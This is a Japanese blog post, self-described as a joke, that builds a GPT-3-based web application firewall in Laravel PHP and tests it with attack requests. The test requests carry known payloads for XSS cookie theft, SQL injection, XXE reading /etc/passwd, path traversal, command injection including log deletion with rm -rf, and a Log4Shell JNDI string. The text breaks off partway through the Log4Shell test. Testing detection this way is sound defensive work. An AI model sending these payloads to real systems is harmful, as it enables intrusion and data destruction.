<span style="color: #ff0000">**※ネタ記事です**</span>

<div style="text-align:center;">[f:id:motikan2010:20230222093517p:plain:w600]</div>

<div class="contents-box"><p>[:contents]</p></div>


## はじめに

　最先端(?)であるGPT-3を使って <span style="color: #ff0000">**次世代WAF**</span> を作っていきます。

　以下が設計図と主な処理の流れ。

1. GPT-3 API に対して、「このHTTPリクエストは攻撃ですか？」とWAFで受信したHTTPリクエストを添えて聞きます。
2. 「Yes, 攻撃だよ」と返答があったら攻撃リクエストと判定します。
3. 処理を中断し、403エラーを返却します。

<figure class="figure-image figure-image-fotolife" title="攻撃者のリクエストがブロックされるまでの流れ">[f:id:motikan2010:20230222012552p:plain:w700]<figcaption>攻撃者のリクエストがブロックされるまでの流れ</figcaption></figure>

- 実際のWAFのようにプロキシに実装するには手間が掛かり過ぎるため **<span style="color: #ff0000">Laravel（PHP製のフレームワーク）に組み込むWAF</span>**にしています。
- <span style="color: #ff0000">**レスポンス時間は気にしない。**</span>

### 検証する脆弱性

　以下の脆弱性に対する攻撃リクエストをブロックできるかを検証していきます。

- XSS
- SQL インジェクション
- XXE
- パストラバーサル
- OS コマンドインジェクション
- Log4Shell
- WordPressのユーザ列挙
- ShellShock

### Tips. GPT-3 とは？

　ChatGPT( ≒ GPT-3.5) の前身みたいなAI。

　ChatGPT は API が提供されていないためこちらを利用している。

## WAFの実装

### 環境・必要なもの

- PHP 7.4
- Laravel 8.75
- OpenAI GPT-3 API の キー（※要登録 & $18は無料）

### ソースコード

　WAFの動作であるリクエストのフィルタリングは **Middleware**（ミドルウェア）を追加することで実現しています。  

　Middleware を追加することによってリクエストまたはレスポンスの前・後処理を記述することができるようになります。  

　前処理でリクエストが攻撃であるかどうかを判定することによってWAFと同様の動作を実現しています。  

　本記事では２つのPHPファイルを作成・修正します。

　まず「`/app/Http/Middleware/Gpt3Waf.php`」を作成します。これがミドルウェアの役割をします。  

主な処理としては以下の通りです。

- 「OPEN_AI_API_KEY」に取得した OpenAI API のキー
-  `handle`関数にリクエストが入ってくる
- `getRequest`関数内で生形式のHTTPリクエストを取得
- `isAttack`関数で攻撃リクエストを判定
  - **GPT-3 API に「Is the following HTTP request a cyber attack? + 生形式の HTTPリクエスト」と問いかける**
  - **返答で「Yes」から始まったら攻撃と判定**
- 攻撃と判定されたら 403 エラーを返却、そうでない場合は処理を続行


　以下がソースコードの全体です。（今回は検証なので主要な処理以外は省いています。）

<div onclick="obj=document.getElementById('20230221_1').style; obj.display=(obj.display=='none')?'block':'none';">
<a style="cursor:pointer;">▶︎ クリックで展開</a>
</div>
<div id="20230221_1" style="display:none;clear:both;">

<div class="md-code" style="width:100%">
```php
<?php

namespace App\Http\Middleware;

use Closure;
use GuzzleHttp\Client;
use Illuminate\Support\Facades\Log;

define('GPT3_COMPLETIONS_ENDPOINT', 'https://api.openai.com/v1/completions');
define('OPEN_AI_API_KEY', '<Need Change>');
define('GPT3_MODEL', 'text-davinci-003');
define('MAX_TOKENS', 3000);
define('GENERATE_COMPLETIONS_COUNT', 1);
define('STOP', null);
define('TEMPERATURE', 0.5);


class Gpt3Waf
{

    public function handle($request, Closure $next)
    {
        $rawHttpRequest = $this->getRequest(); // 生のリクエストを生成
        if ( $this->isAttack($rawHttpRequest) ) {
            // 攻撃リクエストはエラー画面を出力
            abort(403);
        }

        return $next($request);
    }

    private function getRequest(): string
    {
        $http_request = new http_request(false);
        return $http_request->raw();
    }

    private function isAttack(string $rawHttpRequest): bool
    {
        $questionText ="Is the following HTTP request a cyber attack?\n-----\n";
        $questionText .= $rawHttpRequest;

        // GPT-3 にアクセス
        $client = new Client();
        $response = $client->request('POST', GPT3_COMPLETIONS_ENDPOINT, [
            'headers' => [
                'Content-Type'  => 'application/json',
                'Authorization' => 'Bearer '. OPEN_AI_API_KEY,
            ],
            'json' => [
                'prompt'        => $questionText,
                'model'         => GPT3_MODEL,
                'max_tokens'    => MAX_TOKENS,
                'n'             => GENERATE_COMPLETIONS_COUNT,
                'stop'          => STOP,
                'temperature'   => TEMPERATURE,
            ],
            'debug' => false,
        ]);

        // GPT-3の返答を取得
        $gpt3ResultMessage = json_decode($response->getBody()->getContents(), true)['choices'][0]['text'];

        // 確認リクエストと返答をログ出力
        Log::info($questionText);
        Log::info($gpt3ResultMessage);

        // 「Yes」で始まっている場合、攻撃と判定
        if ( str_starts_with(str_replace(array("\r\n", "\r", "\n"), '', $gpt3ResultMessage), 'Yes') ) {
            return true;
        } else {
            return false;
        }

    }
}


/**
 * Reference
 * https://stackoverflow.com/questions/23446989/get-the-raw-request-using-php
 */
class http_request {

    public $add_headers = [];

    function __construct($add_headers = false) {

        $this->retrieve_headers($add_headers);
        $this->body = @file_get_contents('php://input');
    }

    function retrieve_headers($add_headers = false) {

        if ($add_headers) {
            $this->add_headers = array_merge($this->add_headers, $add_headers);
        }

        if (isset($_SERVER['HTTP_METHOD'])) {
            $this->method = $_SERVER['HTTP_METHOD'];
            unset($_SERVER['HTTP_METHOD']);
        } else {
            $this->method = isset($_SERVER['REQUEST_METHOD']) ? $_SERVER['REQUEST_METHOD'] : false;
        }
        $this->protocol = isset($_SERVER['SERVER_PROTOCOL']) ? $_SERVER['SERVER_PROTOCOL'] : false;
        $this->request_method = isset($_SERVER['REQUEST_METHOD']) ? $_SERVER['REQUEST_METHOD'] : false;

        $this->headers = array();
        foreach($_SERVER as $i=>$val) {
            if (strpos($i, 'HTTP_') === 0 || in_array($i, $this->add_headers)) {
                $name = str_replace(array('HTTP_', '_'), array('', '-'), $i);
                if ( $name === 'COOKIE' ) {
                    continue;
                }
                $this->headers[$name] = $val;
            }
        }
    }

    function method() {
        return $this->method;
    }

    function body() {
        return $this->body;
    }

    function header($name) {
        $name = strtoupper($name);
        return isset($this->headers[$name]) ? $this->headers[$name] : false;
    }

    function headers() {
        return $this->headers;
    }

    function raw($refresh = false) {
        if (isset($this->raw) && !$refresh) {
            return $this->raw; // return cached
        }
        $headers = $this->headers();
        $this->raw = "{$this->method} {$_SERVER['REQUEST_URI']} {$this->protocol}\r\n";

        foreach($headers as $i=>$header) {
            $this->raw .= "$i: $header\r\n";
        }
        $this->raw .= "\r\n{$this->body}";
        return $this->raw;
    }

}

```
</div>

</div>

　次に「`/app/Http/Kernel.php`」を編集します。

　以下のように一行追加することで、上で作成したミドルウェアが有効になります。

<div onclick="obj=document.getElementById('20230221_2').style; obj.display=(obj.display=='none')?'block':'none';">
<a style="cursor:pointer;">▶︎ クリックで展開</a>
</div>
<div id="20230221_2" style="display:none;clear:both;">

<div class="md-code" style="width:100%">
```php
<?php

class Kernel extends HttpKernel
{
（省略）
    protected $middlewareGroups = [
        'web' => [
            \App\Http\Middleware\EncryptCookies::class,
            \Illuminate\Cookie\Middleware\AddQueuedCookiesToResponse::class,
            \Illuminate\Session\Middleware\StartSession::class,
            // \Illuminate\Session\Middleware\AuthenticateSession::class,
            \Illuminate\View\Middleware\ShareErrorsFromSession::class,
            \App\Http\Middleware\VerifyCsrfToken::class,
            \Illuminate\Routing\Middleware\SubstituteBindings::class,
            \App\Http\Middleware\Gpt3Waf::class, // ⭐️追加
        ],
（以下省略）
```
</div>

</div>

## 検証

　適当にネットで拾った各脆弱性の攻撃シグネチャを送信して検証を行なっています。

　レスポンス時間が重要なので一応記載しています。（WAF無しの場合のレスポンス時間は0.42秒でした。）

### 正常リクエスト

　まず初めはブロックされないリクエストを送信してみます。

- （攻撃値）
- 3.08 秒（レスポンス時間）
- **検出なし**（GPT-3 で攻撃が検出されたか）

　以下が GPT-3 API に送信している質問内容です。  

<div class="md-code" style="width:100%">
<pre class="code" data-lang="" data-unlink><span style="color: #ff0000">Is the following HTTP request a cyber attack?</span>
-----
POST /post HTTP/1.1
ACCEPT-LANGUAGE: ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7,da;q=0.6,zh-CN;q=0.5,zh-TW;q=0.4,zh;q=0.3
ACCEPT-ENCODING: gzip, deflate, br
REFERER: http://127.0.0.1/
SEC-FETCH-DEST: document
SEC-FETCH-USER: ?1
SEC-FETCH-MODE: navigate
SEC-FETCH-SITE: same-origin
ACCEPT: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
USER-AGENT: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
CONTENT-TYPE: application/x-www-form-urlencoded
ORIGIN: http://127.0.0.1
UPGRADE-INSECURE-REQUESTS: 1
SEC-CH-UA-PLATFORM: "macOS"
SEC-CH-UA-MOBILE: ?0
SEC-CH-UA: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"
CACHE-CONTROL: no-cache
PRAGMA: no-cache
CONTENT-LENGTH: 62
CONNECTION: keep-alive
HOST: 127.0.0.1

msg=TEST%0D%0A&_token=Qu5lkUoatVRwANAHzWEUKMdRrLBcCcS7Np3Nxpsu</pre>
</div>

　以下が GPT-3 からの返答です。

<div class="md-code" style="width:100%">
<pre class="code" data-lang="" data-unlink><span style="color: #ff0000">No, this is not a cyber attack.</span> 
It is an HTTP request, which is a common way for computers to communicate with web servers.</pre>
</div>

### XSS

#### GETパラメータ

- GET：`<script>alert(document.cookie)</script>`
- 2.83 秒
- **<span style="color: #ff0000">検出あり</span>**

　期待通り、攻撃と判定されWAFによってリクエストがブロックされました！

　「Cookieを盗もうとしているスクリプトが含まれている」と概要も含まれています。

<div class="md-code" style="width:100%">
<pre class="code" data-lang="" data-unlink>
Is the following HTTP request a cyber attack?
-----
GET /?p=<span style="color: #ff0000">%3Cscript%3Ealert(document.cookie)%3C/script%3E</span> HTTP/1.1
ACCEPT-LANGUAGE: ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7,da;q=0.6,zh-CN;q=0.5,zh-TW;q=0.4,zh;q=0.3
ACCEPT-ENCODING: gzip, deflate, br
SEC-FETCH-DEST: document
SEC-FETCH-USER: ?1
SEC-FETCH-MODE: navigate
SEC-FETCH-SITE: none
ACCEPT: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
USER-AGENT: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
UPGRADE-INSECURE-REQUESTS: 1
SEC-CH-UA-PLATFORM: "macOS"
SEC-CH-UA-MOBILE: ?0
SEC-CH-UA: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"
CONNECTION: keep-alive
HOST: 127.0.0.1
</pre>
</div>

<div class="md-code" style="width:100%">
<pre class="code" data-lang="" data-unlink>
<span style="color: #ff0000">Yes</span>, this HTTP request is a cyber attack. 
It contains a malicious script <span style="color: #ff0000">that could be used to access and steal cookies</span> from the user's browser.  
</pre>
</div>


　攻撃と判定されたので下画像のように403エラーが返却されました。意図した動作になっているようです。  

<figure class="figure-image figure-image-fotolife" title="攻撃がブロックされたときの画面">[f:id:motikan2010:20230222014153p:plain:w600]<figcaption>攻撃がブロックされたときの画面</figcaption></figure>

（以後このスクリーンショットは省略します。）

#### POSTデータ

- POST：`<script>alert(document.cookie)</script>`
- 2.98 秒
- **検出なし**

<div class="md-code" style="width:100%">
<pre class="code" data-lang="" data-unlink>
Is the following HTTP request a cyber attack?
-----
POST /post HTTP/1.1
ACCEPT-LANGUAGE: ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7,da;q=0.6,zh-CN;q=0.5,zh-TW;q=0.4,zh;q=0.3
ACCEPT-ENCODING: gzip, deflate, br
REFERER: http://127.0.0.1/
SEC-FETCH-DEST: document
SEC-FETCH-USER: ?1
SEC-FETCH-MODE: navigate
SEC-FETCH-SITE: same-origin
ACCEPT: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
USER-AGENT: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
CONTENT-TYPE: application/x-www-form-urlencoded
ORIGIN: http://127.0.0.1
UPGRADE-INSECURE-REQUESTS: 1
SEC-CH-UA-PLATFORM: "macOS"
SEC-CH-UA-MOBILE: ?0
SEC-CH-UA: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"
CACHE-CONTROL: no-cache
PRAGMA: no-cache
CONTENT-LENGTH: 105
CONNECTION: keep-alive
HOST: 127.0.0.1

msg=<span style="color: #ff0000">%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E</span>&_token=Qu5lkUoatVRwANAHzWEUKMdRrLBcCcS7Np3Nxpsu
</pre>
</div>

<div class="md-code" style="width:100%">
<pre class="code" data-lang="" data-unlink>
<span style="color: #ff0000">No</span>, this is not a cyber attack. This is a normal HTTP request.
</pre>
</div>

#### POSTデータ & ヘッダ無し

- POST：`<script>alert(document.cookie)</script>`
- 6.88 秒
- **<span style="color: #ff0000">検出あり</span>**

　GPT-3 に対してヘッダ情報を送信しなかった場合は検出されるようになりました。  

　<span style="color: #ff0000">**ヘッダ情報がノイズになっていると考えられるため、以後ヘッダ有りと無しで攻撃判定を確認していきます。**</span>

<div class="md-code" style="width:100%">
<pre class="code" data-lang="" data-unlink>
Is the following HTTP request a cyber attack?
-----
POST /post HTTP/1.1

msg=<span style="color: #ff0000">%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E</span>&_token=Qu5lkUoatVRwANAHzWEUKMdRrLBcCcS7Np3Nxpsu
</pre>
</div>

<div class="md-code" style="width:100%">
<pre class="code" data-lang="" data-unlink>
<span style="color: #ff0000">Yes</span>, this is a cyber attack. 
The request contains a malicious script that can be used to steal the user's cookies.
</pre>
</div>

### SQL インジェクション

#### GETパラメータ

- GET：`1 OR SLEEP(25)=0 LIMIT 1-- `
- 3.75 秒
- **<span style="color: #ff0000">検出あり</span>**

<div class="md-code" style="width:100%">
<pre class="code" data-lang="" data-unlink>
Is the following HTTP request a cyber attack?
-----
GET /post?p=1<span style="color: #ff0000">%20OR%20SLEEP(25)=0%20LIMIT%201--%20</span> HTTP/1.1
ACCEPT-LANGUAGE: ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7,da;q=0.6,zh-CN;q=0.5,zh-TW;q=0.4,zh;q=0.3
ACCEPT-ENCODING: gzip, deflate, br
SEC-FETCH-DEST: document
SEC-FETCH-USER: ?1
SEC-FETCH-MODE: navigate
SEC-FETCH-SITE: none
ACCEPT: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
USER-AGENT: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
UPGRADE-INSECURE-REQUESTS: 1
SEC-CH-UA-PLATFORM: "macOS"
SEC-CH-UA-MOBILE: ?0
SEC-CH-UA: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"
CACHE-CONTROL: no-cache
PRAGMA: no-cache
CONNECTION: keep-alive
HOST: 127.0.0.1
</pre>
</div>

<div class="md-code" style="width:100%">
<pre class="code" data-lang="" data-unlink>
<span style="color: #ff0000">Yes</span>, this HTTP request is a cyber attack. 
It is attempting to exploit a vulnerability in the application by using a <span style="color: #ff0000">SQL injection attack</span>.
</pre>
</div>

#### GETパラメータ & ヘッダ無し

- 3.23 秒
- **<span style="color: #ff0000">検出あり</span>**

<div class="md-code" style="width:100%">
<pre class="code" data-lang="" data-unlink>
Is the following HTTP request a cyber attack?
-----
GET /post?p=1<span style="color: #ff0000">%20OR%20SLEEP(25)=0%20LIMIT%201--%20</span> HTTP/1.1
</pre>
</div>

<div class="md-code" style="width:100%">
<pre class="code" data-lang="" data-unlink>
<span style="color: #ff0000">Yes</span>, this HTTP request is a cyber attack. It is an example of a <span style="color: #ff0000">SQL injection attack</span>, 
which is a type of attack that attempts to inject malicious code into a database.
</pre>
</div>

### XXE

#### POSTパラメータ①

- POST：`<!ENTITY xxe SYSTEM  "file:///dev/random" >]>`
- 8.01 秒
- **<span style="color: #ff0000">検出なし</span>**

<div class="md-code" style="width:100%">
<pre class="code" data-lang="" data-unlink>
Is the following HTTP request a cyber attack?
-----
POST /post HTTP/1.1
ACCEPT-LANGUAGE: ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7,da;q=0.6,zh-CN;q=0.5,zh-TW;q=0.4,zh;q=0.3
ACCEPT-ENCODING: gzip, deflate, br
REFERER: http://127.0.0.1/
SEC-FETCH-DEST: document
SEC-FETCH-USER: ?1
SEC-FETCH-MODE: navigate
SEC-FETCH-SITE: same-origin
ACCEPT: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
USER-AGENT: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
CONTENT-TYPE: application/x-www-form-urlencoded
ORIGIN: http://127.0.0.1
UPGRADE-INSECURE-REQUESTS: 1
SEC-CH-UA-PLATFORM: "macOS"
SEC-CH-UA-MOBILE: ?0
SEC-CH-UA: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"
CACHE-CONTROL: max-age=0
CONTENT-LENGTH: 291
CONNECTION: keep-alive
HOST: 127.0.0.1

msg=<span style="color: #ff0000">%3C%3Fxml++version%3D%221.0%22+encoding%3D%22ISO-8859-1%22%3F%3E%0D%0A%3C%21DOCTYPE+foo+%5B%0D%0A+++%3C%21ELEMENT+foo+ANY+%3E%0D%0A+++%3C%21ENTITY+xxe+SYSTEM++%22file%3A%2F%2F%2Fdev%2Frandom%22+%3E%5D%3E%0D%0A%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E</span>&_token=Qu5lkUoatVRwANAHzWEUKMdRrLBcCcS7Np3Nxpsu
</pre>
</div>

<div class="md-code" style="width:100%">
<pre class="code" data-lang="" data-unlink>
<span style="color: #ff0000">No</span>, this is not a cyber attack. This is a legitimate HTTP request.
</pre>
</div>

#### POSTパラメータ②

　攻撃シグネチャを少し修正して再度挑戦。

- POST :`<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>`
- 10.00 秒
- **検出なし**

<div class="md-code" style="width:100%">
<pre class="code" data-lang="" data-unlink>
Is the following HTTP request a cyber attack?
-----
POST /post HTTP/1.1
ACCEPT-LANGUAGE: ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7,da;q=0.6,zh-CN;q=0.5,zh-TW;q=0.4,zh;q=0.3
ACCEPT-ENCODING: gzip, deflate, br
REFERER: http://127.0.0.1/
SEC-FETCH-DEST: document
SEC-FETCH-USER: ?1
SEC-FETCH-MODE: navigate
SEC-FETCH-SITE: same-origin
ACCEPT: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
USER-AGENT: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
CONTENT-TYPE: application/x-www-form-urlencoded
ORIGIN: http://127.0.0.1
UPGRADE-INSECURE-REQUESTS: 1
SEC-CH-UA-PLATFORM: "macOS"
SEC-CH-UA-MOBILE: ?0
SEC-CH-UA: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"
CACHE-CONTROL: no-cache
PRAGMA: no-cache
CONTENT-LENGTH: 287
CONNECTION: keep-alive
HOST: 127.0.0.1

msg=<span style="color: #ff0000">%3C%3Fxml+version%3D%221.0%22+encoding%3D%22ISO-8859-1%22%3F%3E%0D%0A%3C%21DOCTYPE+foo+%5B%0D%0A++%3C%21ELEMENT+foo+ANY+%3E%0D%0A++%3C%21ENTITY+xxe+SYSTEM+%22file%3A%2F%2F%2Fetc%2Fpasswd%22+%3E%5D%3E%0D%0A%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E</span>&_token=Qu5lkUoatVRwANAHzWEUKMdRrLBcCcS7Np3Nxpsu
</pre>
</div>

<div class="md-code" style="width:100%">
<pre class="code" data-lang="" data-unlink>
<span style="color: #ff0000">No</span>, this HTTP request is not a cyber attack. 
It is a legitimate request for a web page.
</pre>
</div>

#### POSTパラメータ & ヘッダ無し

- POST :`<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>`
- 4.36 秒
- **<span style="color: #ff0000">検出あり</span>**

<div class="md-code" style="width:100%">
<pre class="code" data-lang="" data-unlink>
Is the following HTTP request a cyber attack?
-----
POST /post HTTP/1.1

msg=<span style="color: #ff0000">%3C%3Fxml++version%3D%221.0%22+encoding%3D%22ISO-8859-1%22%3F%3E%0D%0A%3C%21DOCTYPE+foo+%5B%0D%0A+++%3C%21ELEMENT+foo+ANY+%3E%0D%0A+++%3C%21ENTITY+xxe+SYSTEM++%22file%3A%2F%2F%2Fdev%2Frandom%22+%3E%5D%3E%0D%0A%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E</span>&_token=Qu5lkUoatVRwANAHzWEUKMdRrLBcCcS7Np3Nxpsu
</pre>
</div>

<div class="md-code" style="width:100%">
<pre class="code" data-lang="" data-unlink>
<span style="color: #ff0000">Yes</span>, this is a cyber attack. It is an example of an <span style="color: #ff0000">XML External Entity (XXE) attack</span>, 
which is an attack vector that exploits a web application's processing of XML documents. 
The attacker is attempting to inject malicious code into the application by sending an XML document with a malicious entity reference.
</pre>
</div>

### パストラバーサル

#### GETパラメータ

- GET：`../../../../etc/passwd`
- 3.25 秒
- **検出なし**

<div class="md-code" style="width:100%">
<pre class="code" data-lang="" data-unlink>
Is the following HTTP request a cyber attack?
-----
GET /?file=<span style="color: #ff0000">../../../../etc/passwd</span> HTTP/1.1
ACCEPT-LANGUAGE: ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7,da;q=0.6,zh-CN;q=0.5,zh-TW;q=0.4,zh;q=0.3
ACCEPT-ENCODING: gzip, deflate, br
SEC-FETCH-DEST: document
SEC-FETCH-USER: ?1
SEC-FETCH-MODE: navigate
SEC-FETCH-SITE: none
ACCEPT: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
USER-AGENT: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
UPGRADE-INSECURE-REQUESTS: 1
SEC-CH-UA-PLATFORM: "macOS"
SEC-CH-UA-MOBILE: ?0
SEC-CH-UA: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"
CACHE-CONTROL: no-cache
PRAGMA: no-cache
CONNECTION: keep-alive
HOST: 127.0.0.1
</pre>
</div>

<div class="md-code" style="width:100%">
<pre class="code" data-lang="" data-unlink>
<span style="color: #ff0000">No</span>, this HTTP request is not a cyber attack.
It is a normal request for a file, and it does not contain any malicious code.
</pre>
</div>

#### GETパラメータ & ヘッダ無し

- GET：`../../../../etc/passwd`
- 3.77 秒
- <span style="color: #ff0000">**検出あり**</span>

<div class="md-code" style="width:100%">
<pre class="code" data-lang="" data-unlink>
Is the following HTTP request a cyber attack?
-----
GET /?file=<span style="color: #ff0000">../../../../etc/passwd</span> HTTP/1.1
</pre>
</div>

<div class="md-code" style="width:100%">
<pre class="code" data-lang="" data-unlink>
<span style="color: #ff0000">Yes</span>, this is a type of cyber attack known as a <span style="color: #ff0000">directory traversal attack</span>.
</pre>
</div>

### OS コマンドインジェクション

- GET：`;id`
- 2.35 秒
- **検出なし**

　短い攻撃シグネチャを検出有無が気になる点。

<div class="md-code" style="width:100%">
<pre class="code" data-lang="" data-unlink>
[2023-02-21 13:13:46] local.INFO: Is the following HTTP request a cyber attack?
-----
GET /?filename=bob.txt<span style="color: #ff0000">;id</span> HTTP/1.1
ACCEPT-LANGUAGE: ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7,da;q=0.6,zh-CN;q=0.5,zh-TW;q=0.4,zh;q=0.3
ACCEPT-ENCODING: gzip, deflate, br
SEC-FETCH-DEST: document
SEC-FETCH-USER: ?1
SEC-FETCH-MODE: navigate
SEC-FETCH-SITE: none
ACCEPT: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
USER-AGENT: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
UPGRADE-INSECURE-REQUESTS: 1
SEC-CH-UA-PLATFORM: "macOS"
SEC-CH-UA-MOBILE: ?0
SEC-CH-UA: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"
CACHE-CONTROL: no-cache
PRAGMA: no-cache
CONNECTION: keep-alive
HOST: 127.0.0.1
</pre>
</div>

<div class="md-code" style="width:100%">
<pre class="code" data-lang="" data-unlink>
<span style="color: #ff0000">No</span>, this is not a cyber attack. It is an HTTP request.
</pre>
</div>

#### GETパラメータ & ヘッダー無し

- GET：`;id`
- 4.61 秒
- **検出なし**

<div class="md-code" style="width:100%">
<pre class="code" data-lang="" data-unlink>
Is the following HTTP request a cyber attack?
-----
GET /?filename=bob.txt<span style="color: #ff0000">;id</span> HTTP/1.1
</pre>
</div>

<div class="md-code" style="width:100%">
<pre class="code" data-lang="" data-unlink>
It depends. <span style="color: #ff0000">This request is not necessarily a cyber attack</span>, but it could be a sign of malicious intent.
It could be an attempt to access a file that should not be accessible, or <span style="color: #ff0000">to run a command on the server</span>.
</pre>
</div>

　！？「Yes」「No」以外の返答がきました。

　**確かに私は攻撃シグネチャとして認識してリクエストを送信した身ですので、このリクエストが攻撃だと断言できますが、第三者が判定するのはそもそもムリそう。**

　なのでブロックしないのは正しそう。上のようなリクエストもブロックする堅牢なWAFにしたいなら「No」以外はブロックするように修正すればよさそう。

#### GETパラメータ

　別の攻撃シグネチャで試してみます。

- GET：`; rm -rf /var/log/nginx/access.log`
- ？秒
- **<span style="color: #ff0000">検出あり</span>**

<div class="md-code" style="width:100%">
<pre class="code" data-lang="" data-unlink>
Is the following HTTP request a cyber attack?
-----
GET /?filename=bob.txt<span style="color: #ff0000">;%20rm%20-rf%20/var/log/nginx/access.log</span> HTTP/1.1
ACCEPT-LANGUAGE: ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7,da;q=0.6,zh-CN;q=0.5,zh-TW;q=0.4,zh;q=0.3
ACCEPT-ENCODING: gzip, deflate, br
SEC-FETCH-DEST: document
SEC-FETCH-USER: ?1
SEC-FETCH-MODE: navigate
SEC-FETCH-SITE: none
ACCEPT: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
USER-AGENT: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
UPGRADE-INSECURE-REQUESTS: 1
SEC-CH-UA-PLATFORM: "macOS"
SEC-CH-UA-MOBILE: ?0
SEC-CH-UA: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"
CACHE-CONTROL: no-cache
PRAGMA: no-cache
CONNECTION: keep-alive
HOST: 127.0.0.1
</pre>
</div>

<div class="md-code" style="width:100%">
<pre class="code" data-lang="" data-unlink>
<span style="color: #ff0000">Yes</span>, this HTTP request is a cyber attack. 
The request contains a malicious command <span style="color: #ff0000">to delete the nginx access log</span> from the server, 
which is an attempt to damage the system.
</pre>
</div>

　今度はブロックされました。Nginxアクセスログを削除するコマンドだと判定する余裕感。

### Log4Shell

　次からは特定プロダクトを標的として攻撃リクエストの判定を行なっていきます。

#### POSTパラメータ

- POST：`${jndi:ldap://127.0.0.1:1389/a}`
- 4.16 秒
- **検出なし**

<div class="md-code" style="width:100%">
<pre class="code" data-lang="" data-unlink>
Is the following HTTP request a cyber attack?
-----
POST /post HTTP/1.1
ACCEPT-LANGUAGE: ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7,da;q=0.6,zh-CN;q=0.5,zh-TW;q=0.4,zh;q=0.3
ACCEPT-ENCODING: gzip, deflate, br
REFERER: http://127.0.0.1/?
SEC-FETCH-DEST: document
SEC-FETCH-USER: ?1
SEC-FETCH-MODE: navigate
SEC-FETCH-SITE: same-origin
ACCEPT: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
USER-AGENT: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
CONTENT-TYPE: application/x-www-form-urlencoded
ORIGIN: http://127.0.0.1
UPGRADE-INSECURE-REQUESTS: 1
SEC-CH-UA-PLATFORM: "macOS"
SEC-CH-UA-MOBILE: ?0
SEC-CH-UA: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"
CACHE-CONTROL: no-cache
PRAGMA: no-cache
CONTENT-LENGTH: 101
CONNECTION: keep-alive
HOST: 127.0.0.1

msg=<span style="color: #ff0000">%24%7Bjndi%3Aldap%3A%2F%2F127.0.0.1%3A1389%2Fa%7D</span>&_token=Qu5lkUoatVRwANAHzWEUKMdRrLBcCcS7Np3Nxpsu
</pre>
</div>

<div class="md-code" style="width:100%">
<pre class="code" data-lang="" data-unlink>
